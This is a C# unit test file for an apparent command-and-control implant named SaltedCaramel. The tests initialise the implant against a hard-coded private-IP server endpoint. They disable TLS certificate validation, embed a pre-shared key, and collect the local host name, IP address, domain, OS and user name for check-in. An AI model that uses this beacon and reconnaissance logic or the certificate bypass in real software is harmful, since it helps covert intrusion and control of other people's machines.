using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SaltedCaramel.Tests
{
    [TestClass()]
    public class ImplantTests
    {
        SCImplant implant;

        [TestMethod()]
        public void InitializeImplantValid()
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback = 
                delegate { return true; };


            implant = new SCImplant
            {
                uuid = "3915d66f-e9a5-4912-8442-910e0cee74df",
                endpoint = "https://192.168.38.192/api/v1.3/",
                host = Dns.GetHostName(),
                ip = Dns.GetHostEntry(Dns.GetHostName()) // Necessary because the host may have more than one interface
                    .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString(),
                domain = Environment.UserDomainName,
                os = Environment.OSVersion.VersionString,
                architecture = "x64",
                pid = Process.GetCurrentProcess().Id,
                sleep = 5000,
                user = Environment.UserName,
            };

            HTTP.crypto.PSK = Convert.FromBase64String("CqxQlHyWOSWJprgBA6aiKPP94lCSn8+Ki+gpMVdLNgQ=");

            Assert.IsTrue(implant.InitializeImplant());
        }

        [TestMethod()]
        public void InitializeImplantInvalidUUID()
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback = 
                delegate { return true; };

            SCImplant invalidImplant = new SCImplant
            {
                uuid = "asdf",
                endpoint = "https://192.168.38.192/api/v1.3/",
                host = Dns.GetHostName(),
                ip = Dns.GetHostEntry(Dns.GetHostName()) // Necessary because the host may have more than one interface
                    .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString(),
                domain = Environment.UserDomainName,
                os = Environment.OSVersion.VersionString,
                architecture = "x64",
                pid = Process.GetCurrentProcess().Id,
                sleep = 5000,
                user = Environment.UserName
            };

            Assert.IsFalse(invalidImplant.InitializeImplant());
        }
    }
}
